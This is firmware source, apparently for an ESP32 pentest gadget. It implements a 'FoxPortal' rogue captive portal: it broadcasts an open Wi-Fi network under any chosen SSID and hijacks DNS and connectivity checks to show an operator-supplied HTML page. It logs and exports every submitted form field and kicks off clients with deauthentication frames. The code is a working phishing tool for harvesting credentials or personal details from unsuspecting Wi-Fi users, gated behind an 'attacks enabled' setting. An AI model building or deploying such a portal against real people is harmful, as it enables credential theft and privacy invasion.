#include "fox_portal.h"
#include "config.h"
#include "settings.h"

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <LittleFS.h>
#include <esp_idf_version.h>
#include <esp_wifi.h>
#include <string.h>

namespace {
DNSServer dnsServer;
WebServer webServer(80);
WiFiServer sentinelProbeServer(5094);
bool portalActive = false;

String currentSsid;
String currentDate;

String startHtml;
String thanksHtml;

String fields[2] = {"name", "phone"};
int fieldCount = 2;

String currentTitle = "Get In Touch";
String currentIntro = "Leave your details and we'll follow up shortly.";
String currentNote = "You're free to disconnect from this WiFi network now.";

String cachedDefaultStartHtml;

const char* START_HTML_PATH = "/foxportal_start.html";
const char* THANKS_HTML_PATH = "/foxportal_thanks.html";
const char* TITLE_CFG_PATH = "/foxportal_title.txt";
const char* INTRO_CFG_PATH = "/foxportal_intro.txt";
const char* NOTE_CFG_PATH = "/foxportal_note.txt";
const char* LOG_FILE_PREFIX = "foxportal_log_";
const char* LOG_FILE_SUFFIX = ".txt";
#define LOG_EXPORT_MAX_FILES 64

#define EXPORT_LINE_CONTENT_SAFE_MAX 200
const char* EXPORT_TRUNCATION_MARKER = " ...[TRUNCATED-TOO-LONG]";

String exportSafeLine(const String& line) {
  if ((int)line.length() <= EXPORT_LINE_CONTENT_SAFE_MAX) return line;
  int markerLen = strlen(EXPORT_TRUNCATION_MARKER);
  int keep = EXPORT_LINE_CONTENT_SAFE_MAX - markerLen;
  if (keep < 0) keep = 0;
  return line.substring(0, keep) + EXPORT_TRUNCATION_MARKER;
}

String pendingExportNames[LOG_EXPORT_MAX_FILES];
int pendingExportCount = 0;

bool refuseIfDisabled() {
  if (!FoxSettings::attacksEnabled()) {
    Serial.println("ERROR:DISABLED");
    return true;
  }
  return false;
}

String loadPage(const char* path) {
  if (!LittleFS.exists(path)) return String("");
  File f = LittleFS.open(path, "r");
  if (!f) return String("");
  String content = f.readString();
  f.close();
  return content;
}

bool savePage(const char* path, const String& html) {
  File f = LittleFS.open(path, "w");
  if (!f) return false;
  f.print(html);
  f.close();
  return true;
}

void loadTitleIntroNote() {
  String t = loadPage(TITLE_CFG_PATH);
  if (t.length() > 0) currentTitle = t;
  String in = loadPage(INTRO_CFG_PATH);
  if (in.length() > 0) currentIntro = in;
  String n = loadPage(NOTE_CFG_PATH);
  if (n.length() > 0) currentNote = n;
}

String htmlEscape(const String& in) {
  String out;
  out.reserve(in.length() + 8);
  for (size_t i = 0; i < in.length(); i++) {
    char c = in[i];
    switch (c) {
      case '&': out += "&amp;"; break;
      case '<': out += "&lt;"; break;
      case '>': out += "&gt;"; break;
      case '"': out += "&quot;"; break;
      case '\'': out += "&#39;"; break;
      default: out += c;
    }
  }
  return out;
}

String kvEscape(const String& in) {
  String out;
  out.reserve(in.length());
  for (size_t i = 0; i < in.length(); i++) {
    char c = in[i];
    if (c == ';' || c == '=' || c == '\n' || c == '\r') out += ' ';
    else out += c;
  }
  return out;
}

String buildDefaultStartHtml() {
  String html;
  html.reserve(900);
  html += "<!DOCTYPE html><html><head><meta charset=\"utf-8\">"
          "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
          "<title>";
  html += htmlEscape(currentTitle);
  html += "</title><style>"
          "body{margin:0;background:#111;color:#eee;font-family:sans-serif;"
          "text-align:center;padding:40px 20px}"
          "h1{color:#FF6600;font-size:1.6em;margin-bottom:10px}"
          "p{font-size:0.95em;color:#ccc;margin-bottom:30px}"
          "input{width:100%;max-width:280px;padding:12px;margin:8px 0;"
          "border-radius:8px;border:none;font-size:1em;box-sizing:border-box}"
          "button{width:100%;max-width:280px;padding:12px;margin-top:10px;"
          "border-radius:8px;border:none;background:#FF6600;color:#111;"
          "font-weight:bold;font-size:1em}"
          "</style></head><body>"
          "<h1>";
  html += htmlEscape(currentTitle);
  html += "</h1><p>";
  html += htmlEscape(currentIntro);
  html += "</p><form method=\"POST\" action=\"/\">";
  for (int i = 0; i < fieldCount; i++) {
    html += "<input type=\"text\" name=\"";
    html += fields[i];
    html += "\" placeholder=\"";
    html += htmlEscape(fields[i]);
    html += "\">";
  }
  html += "<button type=\"submit\">Submit</button></form></body></html>";
  return html;
}

void refreshDefaultStartCache() {
  cachedDefaultStartHtml = buildDefaultStartHtml();
}

String buildDefaultThanksTemplate() {
  String html;
  html.reserve(900);
  html += "<!DOCTYPE html><html><head><meta charset=\"utf-8\">"
          "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
          "<title>Thank You</title><style>"
          "body{margin:0;background:#111;color:#eee;font-family:sans-serif;"
          "text-align:center;padding:40px 20px}"
          "h1{color:#FF6600;font-size:1.6em;margin-bottom:10px}"
          "p{font-size:0.95em;color:#ccc;margin:6px 0}"
          ".info{background:#1e1e1e;border-radius:8px;padding:16px;margin:20px auto;"
          "max-width:280px;text-align:left}"
          ".info b{color:#FF6600}"
          "</style></head><body>"
          "<h1>Thank You</h1><div class=\"info\">";
  for (int i = 0; i < fieldCount; i++) {
    html += "<p><b>";
    html += htmlEscape(fields[i]);
    html += ":</b> {{FIELD:";
    html += fields[i];
    html += "}}</p>";
  }
  html += "</div><p>";
  html += htmlEscape(currentNote);
  html += "</p></body></html>";
  return html;
}

void sendChunkedPage(const char* prefix, const String& html) {
  Serial.print(prefix);
  Serial.println(":BEGIN");
  const int chunkSize = 160;
  int len = (int)html.length();
  for (int i = 0; i < len; i += chunkSize) {
    int remaining = len - i;
    int n = remaining < chunkSize ? remaining : chunkSize;
    Serial.print(prefix);
    Serial.print(":CHUNK:");
    Serial.println(html.substring(i, i + n));
  }
  Serial.print(prefix);
  Serial.println(":END");
}

String buildDefaultThanksHtml(const String* names, const String* values, int count) {
  String html;
  html.reserve(700);
  html += "<!DOCTYPE html><html><head><meta charset=\"utf-8\">"
          "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
          "<title>Thank You</title><style>"
          "body{margin:0;background:#111;color:#eee;font-family:sans-serif;"
          "text-align:center;padding:40px 20px}"
          "h1{color:#FF6600;font-size:1.6em;margin-bottom:10px}"
          "p{font-size:0.95em;color:#ccc;margin:6px 0}"
          ".info{background:#1e1e1e;border-radius:8px;padding:16px;margin:20px auto;"
          "max-width:280px;text-align:left}"
          ".info b{color:#FF6600}"
          "</style></head><body>"
          "<h1>Thank You</h1><div class=\"info\">";
  for (int i = 0; i < count; i++) {
    html += "<p><b>";
    html += htmlEscape(names[i]);
    html += ":</b> ";
    html += htmlEscape(values[i]);
    html += "</p>";
  }
  html += "</div><p>";
  html += htmlEscape(currentNote);
  html += "</p></body></html>";
  return html;
}

void logSubmission(const String* names, const String* values, int count) {
  String path = "/" + String(LOG_FILE_PREFIX) + currentDate + String(LOG_FILE_SUFFIX);
  Serial.print("[PORTAL] logSubmission path=");
  Serial.print(path);
  Serial.print(" fieldCount=");
  Serial.println(count);
  File f = LittleFS.open(path, "a");
  if (!f) {
    Serial.println("[PORTAL] logSubmission open FAILED");
    return;
  }
  String line = "SSID=" + kvEscape(currentSsid);
  for (int i = 0; i < count; i++) {
    line += ";";
    line += kvEscape(names[i]);
    line += "=";
    line += kvEscape(values[i]);
  }
  size_t written = f.println(line);
  f.close();
  File check = LittleFS.open(path, "r");
  size_t sizeAfter = check ? check.size() : 0;
  if (check) check.close();
  Serial.print("[PORTAL] logSubmission wrote ");
  Serial.print(written);
  Serial.print(" bytes, file size now=");
  Serial.println(sizeAfter);
}

void exportLogs() {
  LittleFS.begin(true);

  File root = LittleFS.open("/");
  if (!root) {
    Serial.println("ERROR");
    return;
  }

  pendingExportCount = 0;

  File f = root.openNextFile();
  while (f) {
    String name = f.name();
    String base = name.startsWith("/") ? name.substring(1) : name;
    if (base.startsWith(LOG_FILE_PREFIX) && base.endsWith(LOG_FILE_SUFFIX)) {
      if (pendingExportCount < LOG_EXPORT_MAX_FILES) {
        pendingExportNames[pendingExportCount++] = "/" + base;
      }
    }
    f = root.openNextFile();
  }
  root.close();

  if (pendingExportCount == 0) {
    Serial.println("LOGEMPTY");
    return;
  }

  int totalLines = 0;

  for (int i = 0; i < pendingExportCount; i++) {
    String base = pendingExportNames[i].startsWith("/") ?
      pendingExportNames[i].substring(1) : pendingExportNames[i];

    int lineCount = 0;
    {
      File lf = LittleFS.open(pendingExportNames[i], "r");
      if (lf) {
        Serial.print("[PORTAL] export scan ");
        Serial.print(pendingExportNames[i]);
        Serial.print(" rawSize=");
        Serial.println(lf.size());
        while (lf.available()) {
          String line = lf.readStringUntil('\n');
          line.trim();
          if (line.length() > 0) lineCount++;
        }
        lf.close();
      } else {
        Serial.print("[PORTAL] export scan ");
        Serial.print(pendingExportNames[i]);
        Serial.println(" open FAILED");
      }
    }

    Serial.print("LOGFILE:");
    Serial.print(base);
    Serial.print(":");
    Serial.println(lineCount);

    File lf = LittleFS.open(pendingExportNames[i], "r");
    int seq = 0;
    if (lf) {
      while (lf.available()) {
        String line = lf.readStringUntil('\n');
        line.trim();
        if (line.length() > 0) {
          seq++;
          Serial.print("LOGLINE:");
          Serial.print(seq);
          Serial.print(":");
          Serial.println(exportSafeLine(line));
        }
      }
      lf.close();
    }

    Serial.print("LOGFILEEND:");
    Serial.print(base);
    Serial.print(":");
    Serial.println(lineCount);

    totalLines += lineCount;
  }

  Serial.print("LOGDONE:");
  Serial.print(pendingExportCount);
  Serial.print(":");
  Serial.println(totalLines);
}

void confirmExportAndDelete() {
  for (int i = 0; i < pendingExportCount; i++) {
    LittleFS.remove(pendingExportNames[i]);
  }
  pendingExportCount = 0;
  Serial.println("OK");
}

void handleServe() {
  Serial.print("[PORTAL] GET ");
  Serial.print(webServer.uri());
  Serial.print(" host=");
  Serial.print(webServer.hostHeader());
  Serial.print(" client=");
  Serial.println(webServer.client().remoteIP());
  String page = startHtml.length() > 0 ? startHtml : cachedDefaultStartHtml;
  Serial.print("[PORTAL] serving page, bytes=");
  Serial.println(page.length());
  webServer.sendHeader("Connection", "close");
  webServer.send(200, "text/html", page);
}

void handleRedirect() {
  Serial.print("[PORTAL] onNotFound uri=");
  Serial.print(webServer.uri());
  Serial.print(" host=");
  Serial.print(webServer.hostHeader());
  Serial.print(" client=");
  Serial.println(webServer.client().remoteIP());
  webServer.sendHeader("Connection", "close");
  webServer.sendHeader("Location", "http://200.200.200.1/", true);
  webServer.send(302, "text/plain", "");
}

void handleSubmit() {
  String names[FOX_PORTAL_MAX_FIELDS];
  String values[FOX_PORTAL_MAX_FIELDS];
  int count = 0;
  int argCount = webServer.args();
  Serial.print("[PORTAL] handleSubmit POST argCount=");
  Serial.println(argCount);
  for (int i = 0; i < argCount && count < FOX_PORTAL_MAX_FIELDS; i++) {
    String name = webServer.argName(i);
    if (name.length() == 0 || name == "plain") continue;
    if ((int)name.length() > FOX_PORTAL_KEY_MAX) name = name.substring(0, FOX_PORTAL_KEY_MAX);
    String v = webServer.arg(i);
    v.trim();
    if ((int)v.length() > FOX_PORTAL_FIELD_MAX) v = v.substring(0, FOX_PORTAL_FIELD_MAX);
    names[count] = name;
    values[count] = v;
    count++;
    Serial.print("[PORTAL] field ");
    Serial.print(name);
    Serial.print("=");
    Serial.println(v);
  }
  Serial.print("[PORTAL] handleSubmit detected fieldCount=");
  Serial.println(count);

  logSubmission(names, values, count);

  String page;
  if (thanksHtml.length() > 0) {
    page = thanksHtml;
    for (int i = 0; i < count; i++) {
      String token = "{{FIELD:" + names[i] + "}}";
      page.replace(token, htmlEscape(values[i]));
    }
  } else {
    page = buildDefaultThanksHtml(names, values, count);
  }
  webServer.sendHeader("Connection", "close");
  webServer.send(200, "text/html", page);
}

void startPortal(const String& ssid, const String& date) {
  currentSsid = ssid.length() > 0 ? ssid : String(FOX_PORTAL_DEFAULT_SSID);
  currentDate = date.length() > 0 ? date : String("unknown-date");

  LittleFS.begin(true);
  startHtml = loadPage(START_HTML_PATH);
  thanksHtml = loadPage(THANKS_HTML_PATH);
  loadTitleIntroNote();
  refreshDefaultStartCache();

  IPAddress apIP(200, 200, 200, 1);
  IPAddress apNetmask(255, 255, 255, 0);

  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, apNetmask, IPAddress(0, 0, 0, 0), apIP);

  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(53, "*", apIP);
  webServer.onNotFound(handleRedirect);
  webServer.on("/", HTTP_GET, handleServe);
  webServer.on("/", HTTP_POST, handleSubmit);
  webServer.on("/generate_204", HTTP_GET, handleServe);
  webServer.on("/generate_204/", HTTP_GET, handleServe);
  webServer.on("/gen_204", HTTP_GET, handleServe);
  webServer.on("/gen_204/", HTTP_GET, handleServe);
  webServer.begin();
  sentinelProbeServer.begin();

  WiFi.softAP(currentSsid.c_str());
#if ESP_IDF_VERSION >= ESP_IDF_VERSION_VAL(5, 4, 2)
  WiFi.AP.enableDhcpCaptivePortal();
#endif
  delay(200);

  portalActive = true;
  Serial.print("FOXPORTAL:STARTED:");
  Serial.println(currentSsid);
}

void stopPortal() {
  int clientsBefore = WiFi.softAPgetStationNum();

  if (clientsBefore > 0) {
    for (uint16_t aid = 1; aid <= 8; aid++) {
      esp_wifi_deauth_sta(aid);
    }
    delay(100);
  }

  webServer.stop();
  sentinelProbeServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  portalActive = false;

  if (clientsBefore > 0) {
    Serial.println("FOXPORTAL:USERSKICKED");
  }
  Serial.println("FOXPORTAL:STOPPED");
}

}

namespace FoxPortal {
void loop() {
  if (!portalActive) return;
  dnsServer.processNextRequest();
  webServer.handleClient();

  WiFiClient sentinelClient = sentinelProbeServer.available();
  if (sentinelClient) {
    Serial.print("[PORTAL] port 5094 connection from ");
    Serial.println(sentinelClient.remoteIP());
    sentinelClient.stop();
  }
}

bool handleCommand(const String& line) {
  if (line.startsWith("WIFIFOXPORTAL:START")) {
    if (refuseIfDisabled()) return true;
    String rest = line.substring(strlen("WIFIFOXPORTAL:START"));
    String ssid, date;
    if (rest.startsWith(":")) {
      rest = rest.substring(1);
      int c = rest.indexOf(':');
      if (c >= 0) {
        ssid = rest.substring(0, c);
        date = rest.substring(c + 1);
      } else {
        ssid = rest;
      }
    }
    startPortal(ssid, date);
    return true;
  }

  if (line == "WIFIFOXPORTAL:STOP") {
    stopPortal();
    return true;
  }

  if (line == "WIFIFOXPORTAL:STATUS") {
    if (portalActive) {
      Serial.print("FOXPORTAL:RUNNING:");
      Serial.println(currentSsid);
    } else {
      Serial.println("FOXPORTAL:STOPPED");
    }
    return true;
  }

  if (line == "WIFIFOXPORTAL:GETDEFAULTSTART") {
    LittleFS.begin(true);
    loadTitleIntroNote();
    sendChunkedPage("FOXPORTAL:DEFAULTSTART", buildDefaultStartHtml());
    return true;
  }

  if (line == "WIFIFOXPORTAL:GETDEFAULTTHANKS") {
    LittleFS.begin(true);
    loadTitleIntroNote();
    sendChunkedPage("FOXPORTAL:DEFAULTTHANKS", buildDefaultThanksTemplate());
    return true;
  }

  if (line == "WIFIFOXPORTAL:EXPORTLOG") {
    exportLogs();
    return true;
  }

  if (line == "WIFIFOXPORTAL:EXPORTCONFIRM") {
    confirmExportAndDelete();
    return true;
  }

  if (line.startsWith("WIFIFOXPORTAL:SETTITLE:")) {
    String text = line.substring(strlen("WIFIFOXPORTAL:SETTITLE:"));
    if ((int)text.length() > FOX_PORTAL_TITLE_MAX) {
      Serial.println("ERROR:TOOLONG");
      return true;
    }
    LittleFS.begin(true);
    if (!savePage(TITLE_CFG_PATH, text)) {
      Serial.println("ERROR:STORAGE");
      return true;
    }
    currentTitle = text;
    refreshDefaultStartCache();
    Serial.println("OK");
    return true;
  }

  if (line.startsWith("WIFIFOXPORTAL:SETINTRO:")) {
    String text = line.substring(strlen("WIFIFOXPORTAL:SETINTRO:"));
    if ((int)text.length() > FOX_PORTAL_INTRO_MAX) {
      Serial.println("ERROR:TOOLONG");
      return true;
    }
    LittleFS.begin(true);
    if (!savePage(INTRO_CFG_PATH, text)) {
      Serial.println("ERROR:STORAGE");
      return true;
    }
    currentIntro = text;
    refreshDefaultStartCache();
    Serial.println("OK");
    return true;
  }

  if (line.startsWith("WIFIFOXPORTAL:SETNOTE:")) {
    String text = line.substring(strlen("WIFIFOXPORTAL:SETNOTE:"));
    if ((int)text.length() > FOX_PORTAL_NOTE_MAX) {
      Serial.println("ERROR:TOOLONG");
      return true;
    }
    LittleFS.begin(true);
    if (!savePage(NOTE_CFG_PATH, text)) {
      Serial.println("ERROR:STORAGE");
      return true;
    }
    currentNote = text;
    Serial.println("OK");
    return true;
  }

  if (line.startsWith("WIFIFOXPORTAL:SETPAGE:START:")) {
    String html = line.substring(strlen("WIFIFOXPORTAL:SETPAGE:START:"));
    if ((int)html.length() > FOX_PORTAL_HTML_MAX) {
      Serial.println("ERROR:TOOLONG");
      return true;
    }
    LittleFS.begin(true);
    if (!savePage(START_HTML_PATH, html)) {
      Serial.println("ERROR:STORAGE");
      return true;
    }
    startHtml = html;
    Serial.println("OK");
    return true;
  }

  if (line.startsWith("WIFIFOXPORTAL:SETPAGE:THANKS:")) {
    String html = line.substring(strlen("WIFIFOXPORTAL:SETPAGE:THANKS:"));
    if ((int)html.length() > FOX_PORTAL_HTML_MAX) {
      Serial.println("ERROR:TOOLONG");
      return true;
    }
    LittleFS.begin(true);
    if (!savePage(THANKS_HTML_PATH, html)) {
      Serial.println("ERROR:STORAGE");
      return true;
    }
    thanksHtml = html;
    Serial.println("OK");
    return true;
  }

  if (line == "WIFIFOXPORTAL:QR") {
    if (currentSsid.length() == 0) {
      Serial.println("ERROR:NOTSTARTED");
      return true;
    }
    Serial.print("[WIFI/QR/SUCCESS]WIFI:T:nopass;S:");
    Serial.print(currentSsid);
    Serial.println(";;");
    return true;
  }

  return false;
}
}
